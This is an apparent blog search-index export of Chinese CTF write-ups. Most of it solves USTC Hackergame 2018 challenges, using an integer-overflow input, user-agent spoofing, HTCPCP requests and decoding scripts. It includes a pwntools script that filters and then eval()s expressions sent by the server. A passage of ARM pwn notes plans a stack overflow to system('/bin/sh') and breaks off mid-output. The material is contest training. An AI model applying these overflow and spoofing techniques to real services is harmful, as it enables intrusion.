<?xml version="1.0" encoding="utf-8"?>
<search> 
  
    
    <entry>
      <title>ustc-Hackergam2018</title>
      <link href="/2018/10/16/ustc-Hackergam2018/"/>
      <url>/2018/10/16/ustc-Hackergam2018/</url>
      
        <content type="html"><![CDATA[<p>[TOC]</p><h1 id="中科大-Hackergame2018-write-up"><a href="#中科大-Hackergame2018-write-up" class="headerlink" title="中科大-Hackergame2018 write-up"></a>中科大-Hackergame2018 write-up</h1><blockquote><pre><code>这个比赛主要面向新生，较为友好，链接：https://hack.lug.ustc.edu.cn/，此场比赛充满了猫咪与flxg（废理兴工），虽然作为一个老腊肉去做小鲜肉的题很不好意思，但该做的还是要做啦。</code></pre></blockquote><h2 id="签到题"><a href="#签到题" class="headerlink" title="签到题"></a>签到题</h2><blockquote><p>打开<a href="http://202.38.95.46:12002/" target="_blank" rel="noopener">题目链接</a>之后，题面如下图：</p></blockquote><div align="center"><img src="https://i.loli.net/2018/10/12/5bc02b2fdc456.png" alt=""><br><br></div><blockquote><pre><code>Key的输入框限制了长度，通过开发者工具修改页面源码，或者抓包发送 hackergame2018获取 flag:The flag is: `flag{Hackergame2018_Have_Fun!}` </code></pre></blockquote><div align="center"><img src="https://i.loli.net/2018/10/12/5bc02bfb8a96d.png" alt=""></div><h2 id="猫咪问答"><a href="#猫咪问答" class="headerlink" title="猫咪问答"></a>猫咪问答</h2><blockquote><pre><code>这一题虽然表面上是对中科大新生有优势，但是实际上是个社工题。考验学生的搜索能力，信息收集能力。毕竟信安肯定是要跟这个打交道的啦。简单搜索（百度，必应，谷歌）一下，提交得到flag：flag{G00G1E-is-always-YOUR-FRIEND} </code></pre></blockquote><div align="center"><img src="https://i.loli.net/2018/10/12/5bc02da7e38a4.png" alt=""><br><br><div><br><br>## 游园会的集章卡片<br><br>&gt;     这一题实际上考验学生的拼图能力，只不过是花的实时间长短而已，需要注意的就是字母和数字的分辨，可能有的其他题目会需要一个前面的过程来获取到零碎的图片，再到这一步拼图。拼完图可以得到flag：<br>&gt;<br>&gt;     flag{H4PPY_1M4GE_PR0CE551NG}<br><br><div align="center"><img src="https://i.loli.net/2018/10/12/5bc02e508ccdd.png" alt=""><br><br></div><h2 id="猫咪和键盘"><a href="#猫咪和键盘" class="headerlink" title="猫咪和键盘"></a>猫咪和键盘</h2><blockquote><pre><code>题目是一份经过了乱序处理的代码，虽然说是乱序，但还是有一定规律的，比如说可以看出跟列有关系，某列整体移到另一个位置之类的。    简单来说，要还原整个项目是不太可能实现的，所以我们需要根据出题人给我们的路，认真抉择，然后行动。比如源码首部的author，name，url等信息，可以谷歌得到项目的一部分源码，再还原一部分关键性的代码，理解逻辑即可。</code></pre></blockquote><div align="center"><img src="https://i.loli.net/2018/10/12/5bc0378f2d30c.png" alt=""><br><br></div><div align="center"><img src="https://i.loli.net/2018/10/12/5bc0317a3d624.png" alt=""><br><br></div><blockquote><pre><code>根据name，author可以在搜到位于github的项目源码，前一部分自定义函数是相同的，主函数不同，我们还原一下ABC，BAC，CAB：ABC：FfQ47if9Zxw9jXE68VtGABAC：JDk6Y6Xc88UrUtpK3iF8pCAB：7BMs4y2gzdG8Ao2gv6aiJ根据主函数逻辑可以得到flag是像下面这样拼接的：printf(&quot;%s%s%s%s %s%s%s%s%s%s%d %s%d%s&quot;，&quot;f&quot;,&quot;l&quot;,&quot;a&quot;,&quot;g&quot;,ABC,&quot;&quot;,BAC,&quot;&quot;,CAB,&quot;}&quot;,&quot;type_printf&quot;,&quot;_&quot;,&quot;}&quot;)flag{FfQ47if9Zxw9jXE68VtGAJDk6Y6Xc88UrUtpK3iF8p7BMs4y2gzdG8Ao2gv6aiJ125type_printf92}</code></pre></blockquote><h2 id="Word-文档"><a href="#Word-文档" class="headerlink" title="Word 文档"></a>Word 文档</h2><blockquote><pre><code>这题的话主要是给新生扩充一个知识点：office套件实际上都属于zip压缩包，将后缀改为zip就能以压缩包的形式打开office文档，然后看见其文件结构。</code></pre></blockquote><div align="center"><img src="https://i.loli.net/2018/10/12/5bc03a0493152.png" alt=""><br><br></div><h2 id="猫咪银行"><a href="#猫咪银行" class="headerlink" title="猫咪银行"></a>猫咪银行</h2><div align="center"><br><br><img src="https://i.loli.net/2018/10/12/5bc03afaf3184.png" alt=""><br><br></div><blockquote><pre><code>又是一通过非法获取钱财买flag的题目呢，经过简单的尝试输入后发现没什么特殊的漏洞，不能以科学计数（如 0e516516）的方式作为切入点，改cookie只能重置账户，买1/4个flag跟没买似的。    仔细看可以发现，理财时间有下限，但是没有上限，先兑换TDSU，输一个大数试试看，oh一不小心就溢出了：</code></pre></blockquote><div align="center"><img src="https://i.loli.net/2018/10/12/5bc03c707e924.png" alt=""><br><br></div><blockquote><pre><code>但是我们需要控制溢出的收益，不然收益为负，够你受的了。通过控制输入的大数的大小来调节：922337203685477500</code></pre></blockquote><div align="center"><br><br><img src="https://i.loli.net/2018/10/12/5bc03da7f11cd.png" alt=""><br><br></div><blockquote><p>The flag is: <code>flag{Evil_Integer._Evil_Overflow.}</code> </p><p>护网杯中那个辣条之王溢出的题比较精妙，需要通过条件竞争的手法（即多线程同时购买，同一时间多次购买只需要一次付钱），再判断溢出点，从而getflag：题解 <a href="https://qingchenldl.github.io/2018/10/13/%E6%8A%A4%E7%BD%91%E6%9D%AFWP-BitPwn/?tdsourcetag=s_pcqq_aiomsg" target="_blank" rel="noopener">https://qingchenldl.github.io/2018/10/13/%E6%8A%A4%E7%BD%91%E6%9D%AFWP-BitPwn/?tdsourcetag=s_pcqq_aiomsg</a></p></blockquote><h2 id="黑曜石浏览器"><a href="#黑曜石浏览器" class="headerlink" title="黑曜石浏览器"></a>黑曜石浏览器</h2><blockquote><pre><code>这就是那个坑到无数老少爷们，一时风头无俩的黑曜石浏览器(HeiCore)，确实出题人比较良心，为这个题目甚至专门写了一个前端页面来迷惑各位CTFer，这个黑曜石浏览器主页是在百度上不能搜索到的，在必应和谷歌上可以查到，很明显这个页面很不正经，简直是在嘲笑各位CTFer的智商嘛是不是？    好回到题目，实际上我们也做了比较久，尝试过各种方法之后回到了原点：黑曜石浏览器主页，这个主页除了假正经之外还有就是，不能查看源码，用谷歌的开发者工具看主页时会返回404。那么问题已经比较明显了，这里就是出题人的阻碍，为啥要阻碍，因为关键在这里，拿到关键的东西之后我们就可以去题目那里获取flag了。    谷歌用不了我们用火狐嘛，来看看network，看看源码：</code></pre></blockquote><div align="center"><br><br><img src="https://i.loli.net/2018/10/12/5bc0424f6bfaf.png" alt=""><br><br></div><blockquote><pre><code>哦嚯，获得了一个user-agent，题目页面不是需要通过黑曜石浏览器访问吗，既然我们没有黑曜石浏览器这个东西，当然也可以通过user-agent来代表我们是黑曜石浏览器的身份咯，构造请求，加上user-agnet，getflag。The flag is: `flag{H3ic0re_49.1.2623.213_sai_kou}` </code></pre></blockquote><h2 id="回到过去"><a href="#回到过去" class="headerlink" title="回到过去"></a>回到过去</h2><pre class=" language-shell"><code class="language-shell">#input_sequenceqedaflag{.a44a2b8a3d9b2c               #关键在这一行最后的c是保留不保留c44039f93345}.2m3                    #开始换行2m52m12                    #切换到第二行s/4/t                #将当前行的第一个4替换为tqq</code></pre><blockquote><pre><code>这一题介绍了一下ed编辑器的使用，给出了一个文件如上，里面有键盘记录，实际上根据键盘记录，利用ed编辑器重写一遍就可获得flag，但是这个还是有一个坑点，那就是那个多出来的 ESC特殊符，刚开始在MobaXterm上面自带的ed做题，发现 2m3之类的换行命令无法实现，后来使用云服务器进行一波操作得到flag：flag{t4a2b8c44039f93345a3d9b2}</code></pre></blockquote><h2 id="我是谁"><a href="#我是谁" class="headerlink" title="我是谁"></a>我是谁</h2><blockquote><pre><code>这一题有两个小题，充满哲学。考察的是客户端错误相应代码和 “递茶”协议。。。    第一题通过查看network，可以看到status code里面有 ` 418 I AM A TEAPOT`，正好问我是谁嘛，把TEAPOT填进去，getflag1:flag{i_canN0t_BReW_c0ffEE!} </code></pre></blockquote><div align="center"><br><br><img src="https://i.loli.net/2018/10/12/5bc0460ef19b2.png" alt=""><br><br><img src="https://i.loli.net/2018/10/12/5bc0464a1b3a2.png" alt=""><br><br></div><blockquote><pre><code>然后可以获取第二小题的链接，简单查看一下，响应如下：</code></pre></blockquote><pre class=" language-shell"><code class="language-shell">#这年头给大佬递茶都不简单了Brewing tea is not so easy.Try using other methods to request this page.#试试post请求，响应如下：The method "POST" is deprecated.See RFC-7168 for more information.#试试brew请求，响应如下：Please check if there is anything missing in your header.</code></pre><blockquote><pre><code>结合两题的信息 I AM A TEAPOT  + brew tea + RFC-7168搜索一下，可以得到说明文档：https://tools.ietf.org/html/rfc7168    根据文档构造请求header里面的Content-Type: message/teapot，发送过去得到如下信息:</code></pre></blockquote><div align="center"><br><br><img src="https://i.loli.net/2018/10/12/5bc04932d86c3.png" alt=""><br><br></div><blockquote><p>根据返回的信息，我们需要将构造的请求发送到另一个url,即在原url后面加上递茶类型black_tea:</p><p>/the_super_great_hidden_url_for_brewing_tea/black_tea</p><p>getflag:</p><div align="center"><br><br><img src="https://i.loli.net/2018/10/12/5bc049bab0ba3.png" alt=""><br><br></div></blockquote><h2 id="家里有矿"><a href="#家里有矿" class="headerlink" title="家里有矿"></a>家里有矿</h2><blockquote><p>提示：</p><ol><li>本题的浏览器“挖矿”只为演示性目的，几乎不占资源。我们不会以任何形式盗取或浪费大家电脑的算力。</li><li>本题如果使用程序求解，对于普通配置的个人电脑，在解法正确且最优的情况下，求解程序的期望运行时间不会超过几分钟。</li></ol><p>该题并不是常规的web 题，解题过程不涉及注入、XSS、敏感文件泄露、弱类型等安全问题。 </p><p>但是我暂时不会，所以待更新。</p></blockquote><h2 id="秘籍残篇"><a href="#秘籍残篇" class="headerlink" title="秘籍残篇"></a>秘籍残篇</h2><blockquote><pre><code>从这题就开始涉及古文化，玄学知识了。这题也是一个两小题的题目，第一题给出了一段malbolge语言的代码在文件中。一个骚操作。。直接用火狐浏览器打开文件，然后调整页面大小(%30)，宽度得到以下嘲讽CTFer的图案:![](https://i.loli.net/2018/10/12/5bc052d4be6b1.png)flxg{University_Ridiculous}第二题待更新。</code></pre></blockquote><h2 id="猫咪遥控器"><a href="#猫咪遥控器" class="headerlink" title="猫咪遥控器"></a>猫咪遥控器</h2><blockquote><p>为了报复猫咪把自己的代码打乱（见：猫咪与键盘），D 同学把猫咪遥控器绑在可以上（UP）下（DOWN）左（LEFT）右（RIGHT）移动的三轴机械臂上，开始使用树莓派（一款基于 Linux 的单片机计算机）控制三轴机械臂，进而控制猫咪在草地上跑来跑去。 </p><pre><code>此题给出的txt文件中有 U(UP),D(DOWN),L(LEFT),R(RIGHT)，即上下左右咯，既然是让猫咪按这个跑，很简单就是画出路线图嘛，写一个简单的python脚本，利用tutle海龟库写，getflag：</code></pre><p>flag{MeowMeow}</p></blockquote><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#coding=utf-8</span><span class="token keyword">import</span> turtle <span class="token keyword">as</span> T<span class="token keyword">with</span> open<span class="token punctuation">(</span><span class="token string">'seq.txt'</span><span class="token punctuation">,</span><span class="token string">'r'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>    strings <span class="token operator">=</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>strings<span class="token punctuation">)</span>T<span class="token punctuation">.</span>speed<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> strings<span class="token punctuation">:</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>i<span class="token operator">==</span><span class="token string">'U'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        T<span class="token punctuation">.</span>seth<span class="token punctuation">(</span><span class="token number">90</span><span class="token punctuation">)</span>        T<span class="token punctuation">.</span>fd<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>    <span class="token keyword">elif</span><span class="token punctuation">(</span>i<span class="token operator">==</span><span class="token string">"D"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        T<span class="token punctuation">.</span>seth<span class="token punctuation">(</span><span class="token number">270</span><span class="token punctuation">)</span>        T<span class="token punctuation">.</span>fd<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>    <span class="token keyword">elif</span><span class="token punctuation">(</span>i<span class="token operator">==</span><span class="token string">"L"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        T<span class="token punctuation">.</span>seth<span class="token punctuation">(</span><span class="token number">180</span><span class="token punctuation">)</span>        T<span class="token punctuation">.</span>fd<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>    <span class="token keyword">elif</span><span class="token punctuation">(</span>i<span class="token operator">==</span><span class="token string">"R"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        T<span class="token punctuation">.</span>seth<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>        T<span class="token punctuation">.</span>fd<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span></code></pre><blockquote><p>运行结果:</p></blockquote><div align="center"><br><br><img src="https://i.loli.net/2018/10/12/5bc0561d47cad.png" alt=""><br><br></div><h2 id="她的诗"><a href="#她的诗" class="headerlink" title="她的诗"></a>她的诗</h2><blockquote><p>   题目给了一个poem.zip，包含一个python解密脚本和一个包含加密后诗的文件。根据解密脚本可以知道是uuencode，开始过于相信这个解密脚本，没想到出题人在这儿动手脚</p><pre class=" language-python"><code class="language-python">   <span class="token comment" spellcheck="true">#!/usr/bin/env python3</span>   <span class="token comment" spellcheck="true"># This script helps you decode "her poem"</span>   <span class="token keyword">from</span> codecs <span class="token keyword">import</span> decode   fin <span class="token operator">=</span> open<span class="token punctuation">(</span><span class="token string">"poem.txt"</span><span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span>   fout <span class="token operator">=</span> open<span class="token punctuation">(</span><span class="token string">"poem.out"</span><span class="token punctuation">,</span> <span class="token string">"w"</span><span class="token punctuation">)</span>   <span class="token keyword">for</span> i <span class="token keyword">in</span> fin<span class="token punctuation">:</span>      data <span class="token operator">=</span> <span class="token string">"begin 666 &lt;data>\n"</span> <span class="token operator">+</span> i <span class="token operator">+</span> <span class="token string">" \nend\n"</span>      decode_data <span class="token operator">=</span> decode<span class="token punctuation">(</span>data<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">"ascii"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"uu"</span><span class="token punctuation">)</span>      <span class="token keyword">print</span><span class="token punctuation">(</span>decode_data<span class="token punctuation">)</span>      fout<span class="token punctuation">.</span>write<span class="token punctuation">(</span>decode_data<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">"ascii"</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"\n"</span><span class="token punctuation">)</span>   fin<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>   fout<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>   <strong>重点！在线解密密文即可得到真正的flag</strong>，flag分散藏在每行的头部，但是flag少了一个n需要自行添加在最后面补全为一个单词fun。</p></blockquote><p><img src="https://i.loli.net/2018/10/12/5bc057e2cd0ed.png" alt=""></p><h2 id="猫咪克星"><a href="#猫咪克星" class="headerlink" title="猫咪克星"></a>猫咪克星</h2><blockquote><p>nc 202.38.95.46 12009 </p><p>蟒蛇是一种非常容易使用的编程语言，考验你像不像蟒蛇的标准就是给你一些 Python 3 表达式。如果你能正确计算出来，你就通过了验证。 </p><pre><code>简单来说就是要在30秒内完成指定次数表达式的计算，然后可以得到服务器给出的flag，但是坑爹的是表达式中有一些特殊函数，类似于目录遍历 find ~,sleep(100),exit()，所以这种东西我采取了替换的方法。因为print函数在python3和python2中不同，而我需要使用python2中的pwntools库（python3的socket不知为何无用），同时拥有python3的print函数特性，这时候就需要:</code></pre><p>from _ _ future _ _ import print_function</p><p>引入python3 print函数。</p><p>最终脚本如下(脚本比较简陋，可能需要多跑几次才能出flag)：</p></blockquote><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> __future__ <span class="token keyword">import</span> print_function<span class="token comment" spellcheck="true">#coding:utf-8</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>sh <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"202.38.95.46"</span><span class="token punctuation">,</span><span class="token number">12009</span><span class="token punctuation">)</span>getit <span class="token operator">=</span> sh<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>    strings <span class="token operator">=</span> sh<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>    strings <span class="token operator">=</span> strings<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'sleep(100)'</span><span class="token punctuation">,</span><span class="token string">'int(1)'</span><span class="token punctuation">)</span>    strings <span class="token operator">=</span> strings<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'exit()'</span><span class="token punctuation">,</span><span class="token string">'1'</span><span class="token punctuation">)</span>    strings <span class="token operator">=</span> strings<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'find ~'</span><span class="token punctuation">,</span><span class="token string">'echo 1'</span><span class="token punctuation">)</span>    strings <span class="token operator">=</span> strings<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"__import__('time')."</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>strings<span class="token punctuation">)</span>    key <span class="token operator">=</span> eval<span class="token punctuation">(</span>strings<span class="token punctuation">)</span>    sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token string">'flag'</span> <span class="token keyword">in</span> strings<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>strings<span class="token punctuation">)</span>        exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span></code></pre><blockquote><p>脚本运行结果如下：</p></blockquote><div align="center"><br><br><img src="https://i.loli.net/2018/10/12/5bc05b09d0ecf.png" alt=""><br><br></div><h2 id="猫咪电路"><a href="#猫咪电路" class="headerlink" title="猫咪电路"></a>猫咪电路</h2><blockquote><p>当年玩的minercraft被做成了题目，好吧，红石电路，这是一个存档，需要我们按规律输入信号，然后直到光柱亮起，正确的信号即为flag:</p><p>flag{0110101000111100101111111111111111111010} </p></blockquote><div align="center"><br><br><img src="C:\Users\HP\AppData\Local\Temp\1539333133273.png" alt="1539333133273"><br><br></div><h2 id="FLXG-的秘密"><a href="#FLXG-的秘密" class="headerlink" title="FLXG 的秘密"></a>FLXG 的秘密</h2><blockquote><pre><code>题目有点长，我总结一下，给出的文件中是伏羲六十四卦的卦象，简单搜索一下可以知道，伏羲六十四卦可以跟二进制扯上关系，六十四卦分别对应二进制000000-111111，对应关系如下:</code></pre></blockquote><pre class=" language-shell"><code class="language-shell">'坤': '000000', '剥': '000001', '比': '000010', '观': '000011', '豫': '000100', '晋': '000101', '萃': '000110', '否': '000111', '谦': '001000', '艮': '001001', '蹇': '001010', '渐': '001011', '小过': '001100', '旅': '001101', '咸': '001110', '遁': '001111', '师': '010000', '蒙': '010001', '坎': '010010', '涣': '010011', '解': '010100', '未济': '010101', '困': '010110', '讼': '010111', '升': '011000', '蛊': '011001', '井': '011010', '巽': '011011', '恒': '011100', '鼎': '011101', '大过': '011110', '姤': '011111', '复': '100000', '颐': '100001', '屯': '100010', '益': '100011', '震': '100100', '噬嗑': '100101', '随': '100110', '无妄': '100111', '明夷': '101000', '贲': '101001', '既济': '101010', '家人': '101011', '丰': '101100', '离': '101101', '革': '101110', '同人': '101111', '临': '110000', '损': '110001', '节': '110010', '中孚': '110011', '归妹': '110100', '睽': '110101', '兑': '110110', '履': '110111', '泰': '111000', '大畜': '111001', '需': '111010', '小畜': '111011', '大壮': '111100', '大有': '111101', '夬': '111110', '乾': '111111'</code></pre><blockquote><p>写一个python脚本将那个文件中的卦象分别解成二进制，可以发现bit数正好是4039032，可以整除8（8bit为1byte）。到这基本上可以判断思路正确。</p><p>脚本如下:</p></blockquote><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> respecial <span class="token operator">=</span> <span class="token triple-quoted-string string">'''乾﹑坤﹑屯﹑蒙﹑需﹑讼﹑师﹑比﹑小畜﹑履﹑泰﹑否﹑同人﹑大有﹑谦﹑豫﹑随﹑蛊﹑临﹑观﹑噬嗑﹑贲﹑剥﹑复﹑无妄﹑大畜﹑颐﹑大过﹑坎﹑离﹑咸﹑恒﹑遁﹑大壮﹑晋﹑明夷﹑家人﹑睽﹑蹇﹑解﹑损﹑益﹑夬﹑姤﹑萃﹑升﹑困﹑井﹑革﹑鼎﹑震﹑艮﹑渐﹑归妹﹑丰﹑旅﹑巽﹑兑﹑涣﹑节﹑中孚﹑小过﹑既济﹑未济'''</span><span class="token comment" spellcheck="true">#二进制顺序的卦象</span>guashu <span class="token operator">=</span> <span class="token triple-quoted-string string">'''坤、剥、比、观、豫、晋、萃、否、谦、艮、蹇、渐、小过、旅、咸、遁、师、蒙、坎、涣、解、未济、困、讼、升、蛊、井、巽、恒、鼎、大过、姤、复、颐、屯、益、震、噬嗑、随、无妄、明夷、贲、既济、家人、丰、离、革、同人、临、损、节、中孚、归妹、睽、兑、履、泰、大畜、需、小畜、大壮、大有、夬、乾'''</span><span class="token keyword">def</span> <span class="token function">Getword</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    strings <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    s<span class="token operator">=</span>special<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'﹑'</span><span class="token punctuation">)</span>    s2 <span class="token operator">=</span> guashu<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">"、"</span><span class="token punctuation">)</span>    diction <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>    <span class="token keyword">with</span> open<span class="token punctuation">(</span><span class="token string">'G://数据//ctf赛题//中科大ctf//flxg的秘密.txt'</span><span class="token punctuation">,</span>encoding<span class="token operator">=</span><span class="token string">"utf-8"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>        strings2 <span class="token operator">=</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> strings2<span class="token punctuation">:</span>            strings<span class="token punctuation">.</span>append<span class="token punctuation">(</span>i<span class="token punctuation">)</span>        f<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>    strings <span class="token operator">=</span> set<span class="token punctuation">(</span>strings<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#因为卦象中存在一个字或者两个字的卦象，jieba分词库不准确，就用/来区别</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> s<span class="token punctuation">:</span>        diction<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">=</span>strings2<span class="token punctuation">.</span>count<span class="token punctuation">(</span>i<span class="token punctuation">)</span>        strings2 <span class="token operator">=</span> strings2<span class="token punctuation">.</span>replace<span class="token punctuation">(</span>i<span class="token punctuation">,</span><span class="token string">'/'</span><span class="token operator">+</span>i<span class="token operator">+</span><span class="token string">'/'</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> diction<span class="token punctuation">,</span>strings2<span class="token punctuation">,</span>s2<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    diction<span class="token punctuation">,</span>strings2<span class="token punctuation">,</span>s2 <span class="token operator">=</span> Getword<span class="token punctuation">(</span><span class="token punctuation">)</span>    finalbin <span class="token operator">=</span><span class="token string">''</span>    finaldiclist<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span>    dicts<span class="token operator">=</span><span class="token punctuation">{</span><span class="token punctuation">}</span>    n<span class="token operator">=</span><span class="token number">0</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> diction<span class="token punctuation">.</span>items<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        n<span class="token operator">+=</span>i<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">*</span><span class="token number">6</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'bits='</span><span class="token operator">+</span>str<span class="token punctuation">(</span>n<span class="token operator">/</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    finalstrings <span class="token operator">=</span> strings2<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> a <span class="token keyword">in</span> finalstrings<span class="token punctuation">:</span>        <span class="token keyword">if</span> a <span class="token keyword">in</span> s2<span class="token punctuation">:</span>            finaldiclist<span class="token punctuation">.</span>append<span class="token punctuation">(</span>a<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#建立卦象与二进制的关系字典</span>    nice <span class="token operator">=</span><span class="token number">0</span>    n<span class="token operator">=</span><span class="token number">0</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> s2<span class="token punctuation">:</span>        dicts<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> format<span class="token punctuation">(</span>n<span class="token punctuation">,</span><span class="token string">'b'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>zfill<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span>        n<span class="token operator">=</span>n<span class="token operator">+</span><span class="token number">1</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>dicts<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>len<span class="token punctuation">(</span>finaldiclist<span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">6</span><span class="token operator">/</span><span class="token number">8</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#按字典解密写入文件</span>    <span class="token keyword">for</span> b <span class="token keyword">in</span> finaldiclist<span class="token punctuation">:</span>        finalbin<span class="token operator">+=</span>dicts<span class="token punctuation">[</span>b<span class="token punctuation">]</span>    <span class="token keyword">with</span> open<span class="token punctuation">(</span><span class="token string">'finalbin.txt'</span><span class="token punctuation">,</span><span class="token string">'w+'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> ff<span class="token punctuation">:</span>        ff<span class="token punctuation">.</span>write<span class="token punctuation">(</span>finalbin<span class="token punctuation">)</span></code></pre><p><img src="https://i.loli.net/2018/10/12/5bc07be42ac0e.png" alt=""></p><blockquote><p>接下来利用python的libnum库，将二进制转换为字符串得到第一个flag：</p></blockquote><div align="center"><img src="https://i.loli.net/2018/10/12/5bc0611d2a07a.png" alt=""><br><br></div><blockquote><p>用binwalk分析一下内容，发现里面有一个压缩包，进行提取得到以下文件：一个flag elf程序 ，passkey.txt，简单看一下，接下来的第二题应该是逆向了。。待更新。。。</p><p><img src="https://i.loli.net/2018/10/12/5bc061b548e19.png" alt=""></p></blockquote><p>先到这 。</p></div></div>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> writeup </tag>
            
            <tag> ustc </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Pwn-10月16-Codegate2018-melong</title>
      <link href="/2018/10/16/Pwn-10%E6%9C%8816-Codegate2018-melong/"/>
      <url>/2018/10/16/Pwn-10%E6%9C%8816-Codegate2018-melong/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      
    </entry>
    
    <entry>
      <title>Pwn-10月15-qemu</title>
      <link href="/2018/10/15/Pwn-10%E6%9C%8815-qemu/"/>
      <url>/2018/10/15/Pwn-10%E6%9C%8815-qemu/</url>
      
        <content type="html"><![CDATA[<p>[TOC]</p><h1 id="Pwn-10月15-简单了解异构pwn题"><a href="#Pwn-10月15-简单了解异构pwn题" class="headerlink" title="Pwn-10月15-简单了解异构pwn题"></a>Pwn-10月15-简单了解异构pwn题</h1><blockquote><p>&nbsp; &nbsp; &nbsp; &nbsp; 参照m4x大佬的博客简单地搭建了一下环境后，继续来练练手，简单了解一下异构binary调试，如arm，mips，环境搭建参照上一篇。</p><p><img src="https://courses.washington.edu/cp105/_images/ARM_Calling_Convention.png" alt=""></p><p>arm 的参数 1 ~ 4 分别保存到 r0 ~ r3 寄存器中, 剩下的参数从右向左依次入栈, 被调用者实现栈平衡, 返回值存放在 r0 中 。arm 的 pc 指针相当于 eip/rip, b/bl 等指令实现了跳转 </p></blockquote><h2 id="Jarvis-oj-typo"><a href="#Jarvis-oj-typo" class="headerlink" title="Jarvis oj - typo"></a>Jarvis oj - typo</h2><blockquote><p>简单说一下步骤：先查看保护措施，可以发现没有栈溢出保护，运行程序有溢出点可以利用，然后可以找到溢出点位置，找到system函数，以及/bin/sh字符串的位置，然后拿到能够控制 r0寄存器</p></blockquote><h3 id="一-查看保护措施"><a href="#一-查看保护措施" class="headerlink" title="一. 查看保护措施"></a>一. 查看保护措施</h3><blockquote><pre class=" language-bash"><code class="language-bash"><span class="token comment" spellcheck="true">#checksec typo</span>    Arch:     arm-32-little    <span class="token comment" spellcheck="true">#32位小端序 arm架构程序</span>    RELRO:    Partial RELRO    Stack:    No canary found    <span class="token comment" spellcheck="true">#无栈溢出保护</span>    NX:       NX enabled            PIE:      No PIE <span 